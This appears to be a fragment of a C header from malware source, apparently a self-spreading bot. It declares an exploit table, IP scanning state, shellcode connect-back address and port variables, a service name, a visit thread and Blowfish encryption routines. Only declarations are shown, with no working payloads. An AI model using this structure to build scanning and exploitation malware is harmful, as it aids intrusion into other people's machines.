
DWORD			RandomDword();
// Return a random BYTE -- rewrite: bad hack used
BYTE			RandomByte();
int				RandomNumber(int iStart,int iEnd);
extern struct			Exploit_s pExploit[];
extern bool				bScanning;

extern DWORD			dwCurrentIp;
extern struct			ScannerHandler_s pScannerHandler;

// SHellcode functions
extern DWORD			dwSHellcodeIpAddress;
extern char				szSHellcodeIpAddress[16];
extern unsigned short	usSHellcodePort;
extern DWORD			dwShellcodeIpAddress;
extern char				szShellcodeIpAddress[16];

extern char filename2[256];
extern int RSD_PORT;

extern char svcname[128];
extern HANDLE ih;

DWORD WINAPI VISIT_THREAD(LPVOID param);
extern char visit[125];
extern char line[128];

// Blowish 
extern char blowkey[];
extern int nTimeMs;
extern void PBlowCrypt(char key[], char * data);
extern void BlowCrypt( char key[], char * data);
extern void BlowDeCrypt( char key[], char * data);
extern void stripOK(char str[512],char *str2);
